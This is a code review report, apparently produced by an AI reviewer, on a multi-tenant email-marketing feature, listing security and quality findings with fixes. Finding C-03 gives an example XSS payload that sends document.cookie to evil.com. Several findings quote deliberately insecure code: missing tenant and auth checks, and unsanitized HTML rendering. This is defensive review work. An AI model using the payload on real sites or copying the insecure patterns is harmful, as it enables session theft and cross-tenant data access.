# Email Marketing Feature - Code Review Report

**Date:** 2026-02-08
**Reviewer:** Claude Opus 4 (AI Code Reviewer)
**Branch:** feature/email-marketing
**Status:** Review Complete

---

## Summary

| Severity | Count |
|----------|-------|
| CRITICAL | 6 |
| MAJOR | 10 |
| MINOR | 12 |
| INFO | 8 |

**Overall Assessment:** The email marketing feature is functionally structured but contains **critical security vulnerabilities** around multi-tenancy enforcement and XSS exposure. These must be resolved before any production deployment.

---

## CRITICAL Findings

### C-01: Missing `tenant_id` filter on ALL API GET queries

**Severity:** CRITICAL
**Files Affected:**
- `src/app/api/email-marketing/templates/route.ts` (line 14)
- `src/app/api/email-marketing/templates/[id]/route.ts` (line 13)
- `src/app/api/email-marketing/campaigns/route.ts` (line 13)
- `src/app/api/email-marketing/campaigns/[id]/route.ts` (line 12)
- `src/app/api/email-marketing/campaigns/[id]/send/route.ts` (line 12)
- `src/app/api/email-marketing/lists/route.ts` (line 11)
- `src/app/api/email-marketing/lists/[id]/route.ts` (line 10)
- `src/app/api/email-marketing/lists/[id]/members/route.ts` (line 21)

**Description:** Per project rules (CLAUDE.md Section II.2), every API/Query MUST have `WHERE tenant_id = ?`. None of the GET, PUT, PATCH, or DELETE endpoints include a `tenantId` filter in their Prisma `where` clauses. This means any user can read, update, or delete data belonging to any tenant by guessing or enumerating IDs.

**Example (templates list endpoint):**
```typescript
// CURRENT (INSECURE) - line 14
const where: Record<string, unknown> = { deletedAt: null };

// REQUIRED
const where: Record<string, unknown> = { deletedAt: null, tenantId: currentTenantId };
```

**Impact:** Full cross-tenant data leakage. An attacker from Tenant A can view and modify Tenant B's templates, campaigns, lists, and trigger sends on their behalf.

---

### C-02: `tenantId` sourced from untrusted request body in POST endpoints

**Severity:** CRITICAL
**Files Affected:**
- `src/app/api/email-marketing/templates/route.ts` (line 54)
- `src/app/api/email-marketing/campaigns/route.ts` (line 57)
- `src/app/api/email-marketing/lists/route.ts` (line 46)

**Description:** The `tenantId` is taken from `body.tenantId` with a fallback to a hardcoded `'demo-tenant'` string. This allows any API caller to inject an arbitrary `tenantId` and create resources under any tenant.

```typescript
// CURRENT (INSECURE) - templates/route.ts line 54
const tenantId = body.tenantId || 'demo-tenant';
```

**Required Fix:** `tenantId` MUST be derived from the authenticated session/JWT, never from the request body. The `tenantId` field should not be accepted in the Zod schema at all.

---

### C-03: XSS vulnerability via `dangerouslySetInnerHTML` in template preview

**Severity:** CRITICAL
**File:** `src/app/(dashboard)/email-marketing/templates/[id]/edit/page.tsx` (line 196)

**Description:** The template editor renders user-supplied `htmlContent` using `dangerouslySetInnerHTML` without any sanitization:

```tsx
<div
  className="p-4 min-h-[300px]"
  dangerouslySetInnerHTML={{ __html: template.htmlContent || "<p style='color:#999;'>No content yet.</p>" }}
/>
```

An attacker could store malicious HTML/JavaScript in a template's `htmlContent` field (e.g., `<script>document.location='https://evil.com/?c='+document.cookie</script>`) and it would execute in the browser of any user who views the preview.

**Required Fix:** Use a sanitization library such as `DOMPurify` or `sanitize-html` before rendering, or render inside a sandboxed `<iframe>` with `sandbox=""` attribute.

---

### C-04: No authentication/authorization middleware on any API endpoint

**Severity:** CRITICAL
**Files Affected:** All 8 API route files.

**Description:** None of the API routes verify that the request comes from an authenticated user. There is no session check, JWT validation, or any auth middleware. The endpoints are effectively public.

**Required Fix:** Implement authentication middleware (e.g., NextAuth, Supabase Auth) that:
1. Verifies the user's session/token
2. Extracts `tenantId` from the verified session
3. Rejects unauthenticated requests with 401

---

### C-05: Missing status validation on campaign PATCH endpoint

**Severity:** CRITICAL
**File:** `src/app/api/email-marketing/campaigns/[id]/route.ts` (lines 64-88)

**Description:** The PATCH endpoint accepts `body.status` directly from the request body without any validation via Zod schema. An attacker could set arbitrary status values (e.g., `"admin"`, `"hacked"`) or transition a `"sent"` campaign back to `"draft"`, bypassing business logic:

```typescript
// No Zod validation, no status transition validation
if (body.status) {
  const campaign = await prisma.emailCampaign.update({
    where: { id },
    data: {
      status: body.status, // ANY arbitrary string accepted
    },
  });
}
```

**Required Fix:**
1. Validate `body.status` against allowed enum values using Zod: `z.enum(['draft', 'scheduled', 'sending', 'sent', 'cancelled'])`
2. Implement status transition validation (e.g., a `"sent"` campaign cannot go back to `"draft"`)

---

### C-06: Hardcoded database credentials in seed file

**Severity:** CRITICAL
**File:** `prisma/seed.ts` (line 7)

**Description:** Database connection string with username and password is hardcoded:

```typescript
connectionString: "postgresql://postgres:123456@localhost:5432/hubspot_clone?schema=public",
```

While this is a seed file, it exposes credentials directly in the codebase. If committed to a public repo, this is a direct credential leak.

**Required Fix:** Use `process.env.DATABASE_URL` (the main `prisma.ts` lib already does this with a fallback, but the seed file does not).

---

## MAJOR Findings

### M-01: No `tenantId` filter on PUT/DELETE for templates and campaigns

**Severity:** MAJOR
**Files Affected:**
- `src/app/api/email-marketing/templates/[id]/route.ts` (lines 44, 65)
- `src/app/api/email-marketing/campaigns/[id]/route.ts` (lines 52, 73, 96)
- `src/app/api/email-marketing/lists/[id]/route.ts` (line 41)

**Description:** The `update` and `delete` operations use only `where: { id }` without including `tenantId`. Combined with C-01, this allows cross-tenant modification. Even after fixing C-04 (auth), the `tenantId` from the session must be included in `where` clauses to prevent IDOR attacks.

```typescript
// CURRENT (INSECURE)
await prisma.emailMarketingTemplate.update({
  where: { id },
  data: { deletedAt: new Date() },
});

// REQUIRED
await prisma.emailMarketingTemplate.updateMany({
  where: { id, tenantId: sessionTenantId },
  data: { deletedAt: new Date() },
});
```

---

### M-02: `useEffect` dependency array issue - `fetchTemplates` not memoized

**Severity:** MAJOR
**File:** `src/app/(dashboard)/email-marketing/templates/page.tsx` (lines 42-58)

**Description:** The `fetchTemplates` function is declared inside the component but is used in the `useEffect` dependency array indirectly. React ESLint would flag this. The function is re-created on every render, but the `useEffect` lists `[search, category]` as deps. While functionally it works because search/category trigger re-renders, the `fetchTemplates` reference is stale per React rules.

**Recommended Fix:** Use `useCallback` to memoize `fetchTemplates`, or move the fetch logic directly inside `useEffect`.

---

### M-03: No debouncing on search inputs causing excessive API calls

**Severity:** MAJOR
**Files Affected:**
- `src/app/(dashboard)/email-marketing/page.tsx` (lines 53-65)
- `src/app/(dashboard)/email-marketing/templates/page.tsx` (lines 56-58)

**Description:** The `useEffect` triggers an API call on every keystroke in the search input because `search` is in the dependency array. Typing "newsletter" would trigger 10 API calls.

**Recommended Fix:** Implement debouncing (e.g., 300ms) using `setTimeout`/`clearTimeout` in `useEffect`, or use a debounce utility.

---

### M-04: `parseInt` without validation on pagination parameters

**Severity:** MAJOR
**Files Affected:**
- `src/app/api/email-marketing/templates/route.ts` (lines 9-10)
- `src/app/api/email-marketing/campaigns/route.ts` (lines 8-9)
- `src/app/api/email-marketing/lists/route.ts` (lines 8-9)

**Description:** `parseInt` is used on query parameters without validation. Values like `page=-1`, `limit=99999`, or `page=NaN` could cause issues:

```typescript
const page = parseInt(searchParams.get('page') || '1');
const limit = parseInt(searchParams.get('limit') || '20');
```

- `limit=99999` could cause a performance denial-of-service
- `page=0` or `page=-1` would produce negative `skip` values
- Non-numeric strings return `NaN`

**Required Fix:** Add bounds checking: `Math.max(1, Math.min(page, 1000))` and `Math.max(1, Math.min(limit, 100))`.

---

### M-05: No error feedback shown to users on failed operations

**Severity:** MAJOR
**Files Affected:**
- `src/app/(dashboard)/email-marketing/campaigns/[id]/page.tsx` (lines 87-89)
- `src/app/(dashboard)/email-marketing/templates/[id]/edit/page.tsx` (lines 79-81)
- `src/app/(dashboard)/email-marketing/lists/page.tsx` (lines 59-61)
- `src/app/(dashboard)/email-marketing/campaigns/new/page.tsx` (lines 97-99)

**Description:** All error handlers are empty catch blocks with comments like `// error handled silently`. Users get no feedback when operations fail:

```typescript
} catch {
  // error handled silently
}
```

**Required Fix:** Display error toast/notification to the user. At minimum, use `alert()` or a state-based error message.

---

### M-06: Campaign send does not check for deleted contacts

**Severity:** MAJOR
**File:** `src/app/api/email-marketing/campaigns/[id]/send/route.ts` (lines 13-16)

**Description:** When fetching the contact list for sending, soft-deleted contacts are not filtered out. The query includes all members regardless of the contact's `deletedAt` status:

```typescript
include: {
  list: { include: { members: { include: { contact: true } } } },
}
```

**Required Fix:** Add a filter to exclude contacts where `contact.deletedAt` is not null.

---

### M-07: Using `Record<string, unknown>` instead of Prisma-generated types for `where` clauses

**Severity:** MAJOR
**Files Affected:**
- `src/app/api/email-marketing/templates/route.ts` (line 14)
- `src/app/api/email-marketing/campaigns/route.ts` (line 13)
- `src/app/api/email-marketing/campaigns/[id]/route.ts` (line 47)
- `src/app/api/email-marketing/lists/route.ts` (line 11)

**Description:** Using `Record<string, unknown>` for `where` objects bypasses Prisma's TypeScript type-checking, which defeats the purpose of using Prisma with TypeScript. It also introduces risk of typos in field names going undetected.

```typescript
// CURRENT
const where: Record<string, unknown> = { deletedAt: null };

// RECOMMENDED
import { Prisma } from '@prisma/client';
const where: Prisma.EmailMarketingTemplateWhereInput = { deletedAt: null };
```

---

### M-08: No check for campaign `listId` existence before send

**Severity:** MAJOR
**File:** `src/app/api/email-marketing/campaigns/[id]/send/route.ts`

**Description:** While there is a check for `!campaign.list`, if the `listId` references a soft-deleted list, the campaign could still reference it. The query does not filter by `deletedAt: null` on the list itself.

---

### M-09: Missing `updateList` schema - no Zod validation for list updates

**Severity:** MAJOR
**File:** `src/lib/email-marketing/schemas.ts`

**Description:** There is no schema for updating a contact list (e.g., renaming). While there is no PUT endpoint for lists currently, the schema file is incomplete. The `addMembersSchema` only validates the POST members endpoint.

Additionally, the `DELETE` for list members (`src/app/api/email-marketing/lists/[id]/members/route.ts` lines 43-73) does not use Zod validation on the request body:

```typescript
const body = await request.json();
if (body.contactIds && Array.isArray(body.contactIds)) {
```

---

### M-10: `EmailCampaignEvent` model has no `tenantId` field

**Severity:** MAJOR
**File:** `prisma/schema.prisma` (lines 595-617)

**Description:** The `EmailCampaignEvent` model lacks a `tenantId` field. While events are linked to sends (which have `tenantId`), querying events directly for analytics will require joining through `EmailCampaignSend`, which is less efficient and harder to enforce tenant isolation on.

**Recommended Fix:** Add `tenantId` field with index to `EmailCampaignEvent` for direct tenant-scoped queries.

---

## MINOR Findings

### m-01: Duplicate `statusConfig` object across two files

**Severity:** MINOR
**Files Affected:**
- `src/app/(dashboard)/email-marketing/page.tsx` (lines 39-45)
- `src/app/(dashboard)/email-marketing/campaigns/[id]/page.tsx` (lines 46-52)

**Description:** The `statusConfig` object is duplicated identically in both files. This violates DRY and means changes must be made in two places.

**Recommended Fix:** Extract to a shared constants file, e.g., `src/lib/email-marketing/constants.ts`.

---

### m-02: Wrong icon used for "Contact Lists" quick link

**Severity:** MINOR
**File:** `src/app/(dashboard)/email-marketing/page.tsx` (line 224)

**Description:** The "Contact Lists" quick link uses the `AlertTriangle` icon, which semantically represents warnings/errors, not contact lists:

```tsx
<AlertTriangle className="w-4 h-4 text-[#0891b2]" />
```

**Recommended Fix:** Use the `Users` icon instead, which is already imported but only used in other files.

---

### m-03: Missing `key` prop warning risk in stats grid

**Severity:** MINOR
**Files Affected:**
- `src/app/(dashboard)/email-marketing/page.tsx` (line 98)
- `src/app/(dashboard)/email-marketing/campaigns/[id]/page.tsx` (line 161)

**Description:** The `.map()` on stats arrays uses `stat.label` as key. While these are unique within the array and stable, the pattern of inlining complex objects in `.map()` (line 96-97) makes the code harder to read and maintain.

---

### m-04: Stats grid layout not responsive on small screens

**Severity:** MINOR
**File:** `src/app/(dashboard)/email-marketing/page.tsx` (line 92)

**Description:** The stats grid uses `grid-cols-4` without responsive breakpoints:

```tsx
<div className="grid grid-cols-4 gap-4 mb-6">
```

On mobile screens, 4 columns will be too cramped.

**Recommended Fix:** Use `grid-cols-2 md:grid-cols-4` for responsive layout.

---

### m-05: Inconsistent rate display format

**Severity:** MINOR
**File:** `src/app/(dashboard)/email-marketing/page.tsx` (lines 67-70, 191)

**Description:** The `openRate` and `clickRate` functions return `"--"` (em dash) when there is no data, but the table cell always appends `%`:

```tsx
<td className="px-4 py-3 text-sm text-gray-600">{openRate(campaign)}%</td>
```

This produces `"--%"` for campaigns with no sends.

**Recommended Fix:** Conditionally show the `%` suffix, or include it in the function return value.

---

### m-06: `useCount` field on `EmailMarketingTemplate` never incremented

**Severity:** MINOR
**File:** `prisma/schema.prisma` (line 439)

**Description:** The `useCount` and `lastUsedAt` fields exist on `EmailMarketingTemplate` but no API route increments them when a template is used in a campaign.

---

### m-07: Send endpoint marks all sends as `"sent"` immediately without actual email delivery

**Severity:** MINOR
**File:** `src/app/api/email-marketing/campaigns/[id]/send/route.ts` (lines 43-44, 56-63)

**Description:** The send endpoint creates all send records with `status: 'sent'` and marks the campaign as fully delivered immediately. While noted as "demo" behavior (line 47 comment), this conflates the send queue status with actual delivery status.

For production readiness, sends should initially be `"queued"` and a background job should process actual delivery.

---

### m-08: Inconsistent error response format

**Severity:** MINOR
**Files Affected:** All API route files.

**Description:** Some endpoints return `{ error: 'message' }` and some return `{ success: true }`. There is no standard error response schema with error codes. For a consistent API:

```typescript
// Standard error format
{ error: { code: 'NOT_FOUND', message: 'Campaign not found' } }

// Standard success format
{ data: { ... }, meta: { ... } }
```

---

### m-09: No loading state handling on search debounce

**Severity:** MINOR
**File:** `src/app/(dashboard)/email-marketing/page.tsx`

**Description:** When the user types in the search field, there is no loading indicator shown while the API call is pending. The `setLoading(true)` is only called on initial mount. Subsequent searches show stale data until the response arrives.

---

### m-10: ContactListMember does not have `tenantId` for tenant-scoped queries

**Severity:** MINOR
**File:** `prisma/schema.prisma` (lines 545-554)

**Description:** The `ContactListMember` join table has no `tenantId` field. While tenant isolation can be enforced through the parent `ContactList` and `Contact` records, direct queries on this table cannot be tenant-scoped without a join.

---

### m-11: `handleDelete` in templates page does not handle API errors

**Severity:** MINOR
**File:** `src/app/(dashboard)/email-marketing/templates/page.tsx` (lines 60-64)

**Description:** The `handleDelete` function calls `fetch` without checking the response status or wrapping in try/catch:

```typescript
const handleDelete = async (id: string) => {
  if (!confirm("Delete this template?")) return;
  await fetch(`/api/email-marketing/templates/${id}`, { method: "DELETE" });
  fetchTemplates(); // refetch even if delete failed
};
```

If the delete fails, the user sees no error and the list refreshes as though it succeeded.

---

### m-12: Contact Lists page filters locally instead of via API

**Severity:** MINOR
**File:** `src/app/(dashboard)/email-marketing/lists/page.tsx` (lines 72-74)

**Description:** The contact lists page fetches all lists (up to 50) and filters by search locally:

```typescript
const filtered = search
  ? lists.filter((l) => l.name.toLowerCase().includes(search.toLowerCase()))
  : lists;
```

While the templates and campaigns pages send search params to the API, the lists page does client-side filtering. This is inconsistent and will not scale beyond 50 lists.

---

## INFO Findings

### I-01: Prisma schema design is well-structured

**Severity:** INFO
**File:** `prisma/schema.prisma`

**Description:** The email marketing models follow good practices:
- Proper soft delete pattern with `deletedAt` fields on all main entities
- Good denormalization of stats on `EmailCampaign` for query performance
- Proper unique constraint on `EmailCampaignSend` (`@@unique([campaignId, contactId])`)
- Appropriate indexes on foreign keys and commonly queried fields
- `EmailCampaignEvent` has proper event-sourcing structure

---

### I-02: Zod schemas are well-defined for main operations

**Severity:** INFO
**File:** `src/lib/email-marketing/schemas.ts`

**Description:** The Zod validation schemas have appropriate constraints:
- String length limits (`.min(1).max(255)`)
- Email validation (`.email()`)
- Enum validation for categories
- Optional fields properly marked

---

### I-03: Consistent brand color usage

**Severity:** INFO
**Files Affected:** All frontend files.

**Description:** The brand color `#0891b2` is consistently used throughout:
- Primary buttons: `bg-[#0891b2] hover:bg-[#0ea5e9]`
- Focus states: `focus:border-[#0891b2]`
- Accent text: `text-[#0891b2]`
- Loading spinners: `border-[#0891b2]`

Consider extracting to a Tailwind CSS custom theme variable for easier maintenance.

---

### I-04: Good use of soft delete pattern

**Severity:** INFO
**Files Affected:** Template and campaign DELETE endpoints.

**Description:** Delete operations correctly use soft delete by setting `deletedAt: new Date()` rather than hard deleting records. This aligns with project rules.

---

### I-05: Multi-step campaign creation wizard is well-implemented

**Severity:** INFO
**File:** `src/app/(dashboard)/email-marketing/campaigns/new/page.tsx`

**Description:** The step-by-step campaign creation flow is well-structured with:
- Clear step progression with visual indicators
- Input validation per step (`canNext()`)
- Back navigation support
- Both "Save as Draft" and "Send Now" options on final step

---

### I-06: Performance funnel visualization is a good UX feature

**Severity:** INFO
**File:** `src/app/(dashboard)/email-marketing/campaigns/[id]/page.tsx` (lines 271-296)

**Description:** The horizontal bar chart showing Sent > Delivered > Opened > Clicked funnel is a good visualization for campaign performance. Minimum bar width of 2% prevents invisible bars.

---

### I-07: Seed data is comprehensive and realistic

**Severity:** INFO
**File:** `prisma/seed.ts`

**Description:** The seed data includes:
- 3 email templates (welcome, newsletter, promotional) with realistic HTML content
- 2 contact lists with proper member associations
- 2 campaigns in different states (sent, draft) with realistic stats
- Uses `upsert` for idempotent seeding

---

### I-08: Template editor supports merge tags

**Severity:** INFO
**File:** `src/app/(dashboard)/email-marketing/templates/[id]/edit/page.tsx` (line 211)

**Description:** The template editor documents supported merge tags (`{{first_name}}`, `{{last_name}}`, `{{company_name}}`, `{{email}}`). However, there is no backend logic to actually perform the merge tag substitution during send. This should be implemented in the send endpoint.

---

## Prioritized Action Items

### Must Fix Before Production (CRITICAL)
1. **C-04**: Implement authentication middleware on all API endpoints
2. **C-01 + M-01**: Add `tenantId` filter to ALL Prisma queries (read, update, delete)
3. **C-02**: Extract `tenantId` from authenticated session, never from request body
4. **C-03**: Sanitize HTML content before rendering with `dangerouslySetInnerHTML`
5. **C-05**: Add Zod validation and status transition logic to PATCH endpoint
6. **C-06**: Remove hardcoded credentials from seed file

### Should Fix (MAJOR)
7. **M-04**: Add pagination parameter bounds checking
8. **M-05**: Implement user-facing error notifications
9. **M-06**: Filter soft-deleted contacts from campaign sends
10. **M-07**: Use Prisma-generated types instead of `Record<string, unknown>`
11. **M-03**: Add search debouncing
12. **M-10**: Add `tenantId` to `EmailCampaignEvent` model

### Nice to Have (MINOR)
13. **m-01**: Extract shared constants
14. **m-02**: Fix incorrect icon
15. **m-04**: Add responsive breakpoints to stats grid
16. **m-05**: Fix rate display format
17. **m-08**: Standardize API response format

---

## Conclusion

The email marketing feature has a solid foundation with good Prisma schema design, proper soft delete patterns, and clean UI components. However, the **security posture is critically deficient**: there is no authentication, no authorization, no tenant isolation enforcement, and an XSS vulnerability. These 6 critical issues must be resolved before any form of deployment. The major issues around TypeScript strictness, error handling, and input validation should follow immediately after.
